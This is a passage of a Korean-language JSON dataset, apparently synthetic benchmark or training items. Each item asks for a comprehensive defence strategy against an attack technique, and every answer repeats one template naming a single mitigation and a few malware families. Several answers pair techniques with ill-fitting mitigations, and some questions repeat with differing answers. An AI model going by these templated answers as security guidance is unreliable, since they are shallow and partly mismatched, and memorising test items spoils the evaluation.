      "answer": "Symmetric Cryptography 공격 기법에 대응하기 위해서는 Network Intrusion Prevention 등의 방어 조치가 필요하다. 특히 Uroburos, PingPull를 사용한 공격을 방어하는 것이 중요하다.",
      "difficulty": "hard",
      "type": "defensive_strategy",
      "metadata": {
        "attack_pattern": "Symmetric Cryptography"
      }
    },
    {
      "question": "Network Service Discovery을 사용하는 공격에 대한 종합적인 방어 전략을 수립하라.",
      "answer": "Network Service Discovery 공격 기법에 대응하기 위해서는 Network Intrusion Prevention 등의 방어 조치가 필요하다. 특히 Pysa, Caterpillar WebShell를 사용한 공격을 방어하는 것이 중요하다.",
      "difficulty": "hard",
      "type": "defensive_strategy",
      "metadata": {
        "attack_pattern": "Network Service Discovery"
      }
    },
    {
      "question": "Lateral Tool Transfer을 사용하는 공격에 대한 종합적인 방어 전략을 수립하라.",
      "answer": "Lateral Tool Transfer 공격 기법에 대응하기 위해서는 Network Intrusion Prevention 등의 방어 조치가 필요하다. 특히 WannaCry, Emotet를 사용한 공격을 방어하는 것이 중요하다.",
      "difficulty": "hard",
      "type": "defensive_strategy",
      "metadata": {
        "attack_pattern": "Lateral Tool Transfer"
      }
    },
    {
      "question": "Data Obfuscation을 사용하는 공격에 대한 종합적인 방어 전략을 수립하라.",
      "answer": "Data Obfuscation 공격 기법에 대응하기 위해서는 Network Intrusion Prevention 등의 방어 조치가 필요하다. 특히 FlawedAmmyy, SideTwist를 사용한 공격을 방어하는 것이 중요하다.",
      "difficulty": "hard",
      "type": "defensive_strategy",
      "metadata": {
        "attack_pattern": "Data Obfuscation"
      }
    },
    {
      "question": "Malicious Copy and Paste을 사용하는 공격에 대한 종합적인 방어 전략을 수립하라.",
      "answer": "Malicious Copy and Paste 공격 기법에 대응하기 위해서는 Network Intrusion Prevention 등의 방어 조치가 필요하다. 특히 Havoc를 사용한 공격을 방어하는 것이 중요하다.",
      "difficulty": "hard",
      "type": "defensive_strategy",
      "metadata": {
        "attack_pattern": "Malicious Copy and Paste"
      }
    },
    {
      "question": "Spearphishing Attachment을 사용하는 공격에 대한 종합적인 방어 전략을 수립하라.",
      "answer": "Spearphishing Attachment 공격 기법에 대응하기 위해서는 Network Intrusion Prevention 등의 방어 조치가 필요하다. 특히 OceanSalt, TrickBot를 사용한 공격을 방어하는 것이 중요하다.",
      "difficulty": "hard",
      "type": "defensive_strategy",
      "metadata": {
        "attack_pattern": "Spearphishing Attachment"
      }
    },
    {
      "question": "Exfiltration Over Alternative Protocol을 사용하는 공격에 대한 종합적인 방어 전략을 수립하라.",
      "answer": "Exfiltration Over Alternative Protocol 공격 기법에 대응하기 위해서는 Network Intrusion Prevention 등의 방어 조치가 필요하다. 특히 Hydraq, FrameworkPOS를 사용한 공격을 방어하는 것이 중요하다.",
      "difficulty": "hard",
      "type": "defensive_strategy",
      "metadata": {
        "attack_pattern": "Exfiltration Over Alternative Protocol"
      }
    },
    {
      "question": "Adversary-in-the-Middle을 사용하는 공격에 대한 종합적인 방어 전략을 수립하라.",
      "answer": "Adversary-in-the-Middle 공격 기법에 대응하기 위해서는 Network Intrusion Prevention 등의 방어 조치가 필요하다. 특히 Line Runner, Dok를 사용한 공격을 방어하는 것이 중요하다.",
      "difficulty": "hard",
      "type": "defensive_strategy",
      "metadata": {
        "attack_pattern": "Adversary-in-the-Middle"
      }
    },
    {
      "question": "Asymmetric Cryptography을 사용하는 공격에 대한 종합적인 방어 전략을 수립하라.",
      "answer": "Asymmetric Cryptography 공격 기법에 대응하기 위해서는 Network Intrusion Prevention 등의 방어 조치가 필요하다. 특히 Penquin, Gomir를 사용한 공격을 방어하는 것이 중요하다.",
      "difficulty": "hard",
      "type": "defensive_strategy",
      "metadata": {
        "attack_pattern": "Asymmetric Cryptography"
      }
    },
    {
      "question": "Junk Data을 사용하는 공격에 대한 종합적인 방어 전략을 수립하라.",
      "answer": "Junk Data 공격 기법에 대응하기 위해서는 Network Intrusion Prevention 등의 방어 조치가 필요하다. 특히 WellMess, GrimAgent를 사용한 공격을 방어하는 것이 중요하다.",
      "difficulty": "hard",
      "type": "defensive_strategy",
      "metadata": {
        "attack_pattern": "Junk Data"
      }
    },
    {
      "question": "Template Injection을 사용하는 공격에 대한 종합적인 방어 전략을 수립하라.",
      "answer": "Template Injection 공격 기법에 대응하기 위해서는 Network Intrusion Prevention 등의 방어 조치가 필요하다. 특히 WarzoneRAT, Chaes를 사용한 공격을 방어하는 것이 중요하다.",
      "difficulty": "hard",
      "type": "defensive_strategy",
      "metadata": {
        "attack_pattern": "Template Injection"
      }
    },
    {
      "question": "Dead Drop Resolver을 사용하는 공격에 대한 종합적인 방어 전략을 수립하라.",
      "answer": "Dead Drop Resolver 공격 기법에 대응하기 위해서는 Network Intrusion Prevention 등의 방어 조치가 필요하다. 특히 Xbash, MOPSLED를 사용한 공격을 방어하는 것이 중요하다.",
      "difficulty": "hard",
      "type": "defensive_strategy",
      "metadata": {
        "attack_pattern": "Dead Drop Resolver"
      }
    },
    {
      "question": "Internal Proxy을 사용하는 공격에 대한 종합적인 방어 전략을 수립하라.",
      "answer": "Internal Proxy 공격 기법에 대응하기 위해서는 Network Intrusion Prevention 등의 방어 조치가 필요하다. 특히 Stuxnet, Hikit를 사용한 공격을 방어하는 것이 중요하다.",
      "difficulty": "hard",
      "type": "defensive_strategy",
      "metadata": {
        "attack_pattern": "Internal Proxy"
      }
    },
    {
      "question": "Data Transfer Size Limits을 사용하는 공격에 대한 종합적인 방어 전략을 수립하라.",
      "answer": "Data Transfer Size Limits 공격 기법에 대응하기 위해서는 Network Intrusion Prevention 등의 방어 조치가 필요하다. 특히 Helminth, Carbanak를 사용한 공격을 방어하는 것이 중요하다.",
      "difficulty": "hard",
      "type": "defensive_strategy",
      "metadata": {
        "attack_pattern": "Data Transfer Size Limits"
      }
    },
    {
      "question": "Mail Protocols을 사용하는 공격에 대한 종합적인 방어 전략을 수립하라.",
      "answer": "Mail Protocols 공격 기법에 대응하기 위해서는 Network Intrusion Prevention 등의 방어 조치가 필요하다. 특히 LunarMail, SUGARDUMP를 사용한 공격을 방어하는 것이 중요하다.",
      "difficulty": "hard",
      "type": "defensive_strategy",
      "metadata": {
        "attack_pattern": "Mail Protocols"
      }
    },
    {
      "question": "Scheduled Transfer을 사용하는 공격에 대한 종합적인 방어 전략을 수립하라.",
      "answer": "Scheduled Transfer 공격 기법에 대응하기 위해서는 Network Intrusion Prevention 등의 방어 조치가 필요하다. 특히 Kazuar, Chrommme를 사용한 공격을 방어하는 것이 중요하다.",
      "difficulty": "hard",
      "type": "defensive_strategy",
      "metadata": {
        "attack_pattern": "Scheduled Transfer"
      }
    },
    {
      "question": "Phishing을 사용하는 공격에 대한 종합적인 방어 전략을 수립하라.",
      "answer": "Phishing 공격 기법에 대응하기 위해서는 Network Intrusion Prevention 등의 방어 조치가 필요하다. 특히 Royal, INC Ransomware를 사용한 공격을 방어하는 것이 중요하다.",
      "difficulty": "hard",
      "type": "defensive_strategy",
      "metadata": {
        "attack_pattern": "Phishing"
      }
    },
    {
      "question": "Non-Standard Encoding을 사용하는 공격에 대한 종합적인 방어 전략을 수립하라.",
      "answer": "Non-Standard Encoding 공격 기법에 대응하기 위해서는 Network Intrusion Prevention 등의 방어 조치가 필요하다. 특히 PowGoop, Lizar를 사용한 공격을 방어하는 것이 중요하다.",
      "difficulty": "hard",
      "type": "defensive_strategy",
      "metadata": {
        "attack_pattern": "Non-Standard Encoding"
      }
    },
    {
      "question": "Remote Access Tools을 사용하는 공격에 대한 종합적인 방어 전략을 수립하라.",
      "answer": "Remote Access Tools 공격 기법에 대응하기 위해서는 Network Intrusion Prevention 등의 방어 조치가 필요하다. 특히 Egregor, InvisibleFerret를 사용한 공격을 방어하는 것이 중요하다.",
      "difficulty": "hard",
      "type": "defensive_strategy",
      "metadata": {
        "attack_pattern": "Remote Access Tools"
      }
    },
    {
      "question": "Steganography을 사용하는 공격에 대한 종합적인 방어 전략을 수립하라.",
      "answer": "Steganography 공격 기법에 대응하기 위해서는 Network Intrusion Prevention 등의 방어 조치가 필요하다. 특히 SUNBURST, Duqu를 사용한 공격을 방어하는 것이 중요하다.",
      "difficulty": "hard",
      "type": "defensive_strategy",
      "metadata": {
        "attack_pattern": "Steganography"
      }
    },
    {
      "question": "File Transfer Protocols을 사용하는 공격에 대한 종합적인 방어 전략을 수립하라.",
      "answer": "File Transfer Protocols 공격 기법에 대응하기 위해서는 Network Intrusion Prevention 등의 방어 조치가 필요하다. 특히 Disco, NOKKI를 사용한 공격을 방어하는 것이 중요하다.",
      "difficulty": "hard",
      "type": "defensive_strategy",
      "metadata": {
        "attack_pattern": "File Transfer Protocols"
      }
    },
    {
      "question": "Bidirectional Communication을 사용하는 공격에 대한 종합적인 방어 전략을 수립하라.",
      "answer": "Bidirectional Communication 공격 기법에 대응하기 위해서는 Network Intrusion Prevention 등의 방어 조치가 필요하다. 특히 Sagerunex, BLACKCOFFEE를 사용한 공격을 방어하는 것이 중요하다.",
      "difficulty": "hard",
      "type": "defensive_strategy",
      "metadata": {
        "attack_pattern": "Bidirectional Communication"
      }
    },
    {
      "question": "Proxy을 사용하는 공격에 대한 종합적인 방어 전략을 수립하라.",
      "answer": "Proxy 공격 기법에 대응하기 위해서는 Network Intrusion Prevention 등의 방어 조치가 필요하다. 특히 RainyDay, KEYPLUG를 사용한 공격을 방어하는 것이 중요하다.",
      "difficulty": "hard",
      "type": "defensive_strategy",
      "metadata": {
        "attack_pattern": "Proxy"
      }
    },
    {
      "question": "Supply Chain Compromise을 사용하는 공격에 대한 종합적인 방어 전략을 수립하라.",
      "answer": "Supply Chain Compromise 공격 기법에 대응하기 위해서는 Vulnerability Scanning 등의 방어 조치가 필요하다. 특히 Raccoon Stealer, Lumma Stealer를 사용한 공격을 방어하는 것이 중요하다.",
      "difficulty": "hard",
      "type": "defensive_strategy",
      "metadata": {
        "attack_pattern": "Supply Chain Compromise"
      }
    },
    {
      "question": "Compromise Software Supply Chain을 사용하는 공격에 대한 종합적인 방어 전략을 수립하라.",
      "answer": "Compromise Software Supply Chain 공격 기법에 대응하기 위해서는 Vulnerability Scanning 등의 방어 조치가 필요하다. 특히 CCBkdr, SUNSPOT를 사용한 공격을 방어하는 것이 중요하다.",
      "difficulty": "hard",
      "type": "defensive_strategy",
      "metadata": {
        "attack_pattern": "Compromise Software Supply Chain"
      }
    },
    {
      "question": "Compromise Software Dependencies and Development Tools을 사용하는 공격에 대한 종합적인 방어 전략을 수립하라.",
      "answer": "Compromise Software Dependencies and Development Tools 공격 기법에 대응하기 위해서는 Vulnerability Scanning 등의 방어 조치가 필요하다. 특히 XCSSET, BeaverTail를 사용한 공격을 방어하는 것이 중요하다.",
      "difficulty": "hard",
      "type": "defensive_strategy",
      "metadata": {
        "attack_pattern": "Compromise Software Dependencies and Development Tools"
      }
    },
    {
      "question": "Exploitation of Remote Services을 사용하는 공격에 대한 종합적인 방어 전략을 수립하라.",
      "answer": "Exploitation of Remote Services 공격 기법에 대응하기 위해서는 Vulnerability Scanning 등의 방어 조치가 필요하다. 특히 TrickBot, Lucifer를 사용한 공격을 방어하는 것이 중요하다.",
      "difficulty": "hard",
      "type": "defensive_strategy",
      "metadata": {
        "attack_pattern": "Exploitation of Remote Services"
      }
    },
    {
      "question": "Exploit Public-Facing Application을 사용하는 공격에 대한 종합적인 방어 전략을 수립하라.",
      "answer": "Exploit Public-Facing Application 공격 기법에 대응하기 위해서는 Vulnerability Scanning 등의 방어 조치가 필요하다. 특히 Siloscape, SoreFang를 사용한 공격을 방어하는 것이 중요하다.",
      "difficulty": "hard",
      "type": "defensive_strategy",
      "metadata": {
        "attack_pattern": "Exploit Public-Facing Application"
      }
    },
    {
      "question": "Container Administration Command을 사용하는 공격에 대한 종합적인 방어 전략을 수립하라.",
      "answer": "Container Administration Command 공격 기법에 대응하기 위해서는 Limit Access to Resource Over Network 등의 방어 조치가 필요하다. 특히 Kinsing, Siloscape를 사용한 공격을 방어하는 것이 중요하다.",
      "difficulty": "hard",
      "type": "defensive_strategy",
      "metadata": {
        "attack_pattern": "Container Administration Command"
      }
    },
    {
      "question": "Exploit Public-Facing Application을 사용하는 공격에 대한 종합적인 방어 전략을 수립하라.",
      "answer": "Exploit Public-Facing Application 공격 기법에 대응하기 위해서는 Limit Access to Resource Over Network 등의 방어 조치가 필요하다. 특히 Siloscape, SoreFang를 사용한 공격을 방어하는 것이 중요하다.",
      "difficulty": "hard",
      "type": "defensive_strategy",
      "metadata": {
        "attack_pattern": "Exploit Public-Facing Application"
      }
    },
    {
      "question": "Container and Resource Discovery을 사용하는 공격에 대한 종합적인 방어 전략을 수립하라.",
      "answer": "Container and Resource Discovery 공격 기법에 대응하기 위해서는 Limit Access to Resource Over Network 등의 방어 조치가 필요하다. 특히 Hildegard를 사용한 공격을 방어하는 것이 중요하다.",
      "difficulty": "hard",
      "type": "defensive_strategy",
      "metadata": {
        "attack_pattern": "Container and Resource Discovery"
      }
    },
    {
      "question": "External Remote Services을 사용하는 공격에 대한 종합적인 방어 전략을 수립하라.",
      "answer": "External Remote Services 공격 기법에 대응하기 위해서는 Limit Access to Resource Over Network 등의 방어 조치가 필요하다. 특히 Doki, Kinsing를 사용한 공격을 방어하는 것이 중요하다.",
      "difficulty": "hard",
      "type": "defensive_strategy",
      "metadata": {
        "attack_pattern": "External Remote Services"
      }
    },
    {
      "question": "SMB/Windows Admin Shares을 사용하는 공격에 대한 종합적인 방어 전략을 수립하라.",
      "answer": "SMB/Windows Admin Shares 공격 기법에 대응하기 위해서는 Limit Access to Resource Over Network 등의 방어 조치가 필요하다. 특히 reGeorg, Anchor를 사용한 공격을 방어하는 것이 중요하다.",
      "difficulty": "hard",
      "type": "defensive_strategy",
      "metadata": {
        "attack_pattern": "SMB/Windows Admin Shares"
      }
    },
    {
      "question": "Unsecured Credentials을 사용하는 공격에 대한 종합적인 방어 전략을 수립하라.",
      "answer": "Unsecured Credentials 공격 기법에 대응하기 위해서는 Limit Access to Resource Over Network 등의 방어 조치가 필요하다. 특히 Astaroth, DarkGate를 사용한 공격을 방어하는 것이 중요하다.",
      "difficulty": "hard",
      "type": "defensive_strategy",
      "metadata": {
        "attack_pattern": "Unsecured Credentials"
      }
    },
    {
      "question": "Deploy Container을 사용하는 공격에 대한 종합적인 방어 전략을 수립하라.",
      "answer": "Deploy Container 공격 기법에 대응하기 위해서는 Limit Access to Resource Over Network 등의 방어 조치가 필요하다. 특히 Doki, Kinsing를 사용한 공격을 방어하는 것이 중요하다.",
      "difficulty": "hard",
      "type": "defensive_strategy",
      "metadata": {
        "attack_pattern": "Deploy Container"
      }
    },
    {
      "question": "Remote Desktop Protocol을 사용하는 공격에 대한 종합적인 방어 전략을 수립하라.",
      "answer": "Remote Desktop Protocol 공격 기법에 대응하기 위해서는 Limit Access to Resource Over Network 등의 방어 조치가 필요하다. 특히 Cobalt Strike, zwShell를 사용한 공격을 방어하는 것이 중요하다.",
      "difficulty": "hard",
      "type": "defensive_strategy",
      "metadata": {
        "attack_pattern": "Remote Desktop Protocol"
      }
    },
    {
      "question": "Cloud Instance Metadata API을 사용하는 공격에 대한 종합적인 방어 전략을 수립하라.",
      "answer": "Cloud Instance Metadata API 공격 기법에 대응하기 위해서는 Limit Access to Resource Over Network 등의 방어 조치가 필요하다. 특히 Hildegard를 사용한 공격을 방어하는 것이 중요하다.",
      "difficulty": "hard",
      "type": "defensive_strategy",
      "metadata": {
        "attack_pattern": "Cloud Instance Metadata API"
      }
    },
    {
      "question": "RDP Hijacking을 사용하는 공격에 대한 종합적인 방어 전략을 수립하라.",
      "answer": "RDP Hijacking 공격 기법에 대응하기 위해서는 Limit Access to Resource Over Network 등의 방어 조치가 필요하다. 특히 WannaCry를 사용한 공격을 방어하는 것이 중요하다.",
      "difficulty": "hard",
      "type": "defensive_strategy",
      "metadata": {
        "attack_pattern": "RDP Hijacking"
      }
    },
    {
      "question": "Adversary-in-the-Middle을 사용하는 공격에 대한 종합적인 방어 전략을 수립하라.",
      "answer": "Adversary-in-the-Middle 공격 기법에 대응하기 위해서는 Limit Access to Resource Over Network 등의 방어 조치가 필요하다. 특히 Line Runner, Dok를 사용한 공격을 방어하는 것이 중요하다.",
      "difficulty": "hard",
      "type": "defensive_strategy",
      "metadata": {
        "attack_pattern": "Adversary-in-the-Middle"
      }
    },
    {
      "question": "Remote Services을 사용하는 공격에 대한 종합적인 방어 전략을 수립하라.",
      "answer": "Remote Services 공격 기법에 대응하기 위해서는 Limit Access to Resource Over Network 등의 방어 조치가 필요하다. 특히 Stuxnet, Kivars를 사용한 공격을 방어하는 것이 중요하다.",
      "difficulty": "hard",
      "type": "defensive_strategy",
      "metadata": {
        "attack_pattern": "Remote Services"
      }
    },
    {
      "question": "Clear Mailbox Data을 사용하는 공격에 대한 종합적인 방어 전략을 수립하라.",
      "answer": "Clear Mailbox Data 공격 기법에 대응하기 위해서는 Remote Data Storage 등의 방어 조치가 필요하다. 특히 Goopy, LunarMail를 사용한 공격을 방어하는 것이 중요하다.",
      "difficulty": "hard",
      "type": "defensive_strategy",
      "metadata": {
        "attack_pattern": "Clear Mailbox Data"
      }
    },
    {
      "question": "Clear Persistence을 사용하는 공격에 대한 종합적인 방어 전략을 수립하라.",
      "answer": "Clear Persistence 공격 기법에 대응하기 위해서는 Remote Data Storage 등의 방어 조치가 필요하다. 특히 RTM, Raspberry Robin를 사용한 공격을 방어하는 것이 중요하다.",
      "difficulty": "hard",
      "type": "defensive_strategy",
      "metadata": {
        "attack_pattern": "Clear Persistence"
      }
    },
    {
      "question": "Software Deployment Tools을 사용하는 공격에 대한 종합적인 방어 전략을 수립하라.",
      "answer": "Software Deployment Tools 공격 기법에 대응하기 위해서는 Remote Data Storage 등의 방어 조치가 필요하다. 특히 Wiper를 사용한 공격을 방어하는 것이 중요하다.",
      "difficulty": "hard",
      "type": "defensive_strategy",
      "metadata": {
        "attack_pattern": "Software Deployment Tools"
      }
    },
    {
      "question": "Indicator Removal을 사용하는 공격에 대한 종합적인 방어 전략을 수립하라.",
      "answer": "Indicator Removal 공격 기법에 대응하기 위해서는 Remote Data Storage 등의 방어 조치가 필요하다. 특히 Neoichor, SUNBURST를 사용한 공격을 방어하는 것이 중요하다.",
      "difficulty": "hard",
      "type": "defensive_strategy",
      "metadata": {
        "attack_pattern": "Indicator Removal"
      }
    },
    {
      "question": "Clear Command History을 사용하는 공격에 대한 종합적인 방어 전략을 수립하라.",
      "answer": "Clear Command History 공격 기법에 대응하기 위해서는 Remote Data Storage 등의 방어 조치가 필요하다. 특히 Hildegard, Kobalos를 사용한 공격을 방어하는 것이 중요하다.",
      "difficulty": "hard",
      "type": "defensive_strategy",
      "metadata": {
        "attack_pattern": "Clear Command History"
      }
    },
    {
      "question": "Stored Data Manipulation을 사용하는 공격에 대한 종합적인 방어 전략을 수립하라.",
      "answer": "Stored Data Manipulation 공격 기법에 대응하기 위해서는 Remote Data Storage 등의 방어 조치가 필요하다. 특히 MultiLayer Wiper, SUNSPOT를 사용한 공격을 방어하는 것이 중요하다.",
      "difficulty": "hard",
      "type": "defensive_strategy",
      "metadata": {
        "attack_pattern": "Stored Data Manipulation"
      }
    },
    {
      "question": "Clear Network Connection History and Configurations을 사용하는 공격에 대한 종합적인 방어 전략을 수립하라.",
      "answer": "Clear Network Connection History and Configurations 공격 기법에 대응하기 위해서는 Remote Data Storage 등의 방어 조치가 필요하다. 특히 SUNBURST를 사용한 공격을 방어하는 것이 중요하다.",
      "difficulty": "hard",
      "type": "defensive_strategy",
      "metadata": {
        "attack_pattern": "Clear Network Connection History and Configurations"
      }
    },
    {
      "question": "Automated Collection을 사용하는 공격에 대한 종합적인 방어 전략을 수립하라.",
      "answer": "Automated Collection 공격 기법에 대응하기 위해서는 Remote Data Storage 등의 방어 조치가 필요하다. 특히 MESSAGETAP, StrelaStealer를 사용한 공격을 방어하는 것이 중요하다.",
      "difficulty": "hard",
      "type": "defensive_strategy",
      "metadata": {
        "attack_pattern": "Automated Collection"
      }
    },
    {
      "question": "Clear Linux or Mac System Logs을 사용하는 공격에 대한 종합적인 방어 전략을 수립하라.",
      "answer": "Clear Linux or Mac System Logs 공격 기법에 대응하기 위해서는 Remote Data Storage 등의 방어 조치가 필요하다. 특히 Proton, MacMa를 사용한 공격을 방어하는 것이 중요하다.",
      "difficulty": "hard",
      "type": "defensive_strategy",
      "metadata": {
        "attack_pattern": "Clear Linux or Mac System Logs"
      }
    },
    {
      "question": "Clear Windows Event Logs을 사용하는 공격에 대한 종합적인 방어 전략을 수립하라.",
      "answer": "Clear Windows Event Logs 공격 기법에 대응하기 위해서는 Remote Data Storage 등의 방어 조치가 필요하다. 특히 HermeticWiper, BlackEnergy를 사용한 공격을 방어하는 것이 중요하다.",
      "difficulty": "hard",
      "type": "defensive_strategy",
      "metadata": {
        "attack_pattern": "Clear Windows Event Logs"
      }
    },
    {
      "question": "Cloud Instance Metadata API을 사용하는 공격에 대한 종합적인 방어 전략을 수립하라.",
      "answer": "Cloud Instance Metadata API 공격 기법에 대응하기 위해서는 Filter Network Traffic 등의 방어 조치가 필요하다. 특히 Hildegard를 사용한 공격을 방어하는 것이 중요하다.",
      "difficulty": "hard",
      "type": "defensive_strategy",
      "metadata": {
        "attack_pattern": "Cloud Instance Metadata API"
      }
    }
  ]
}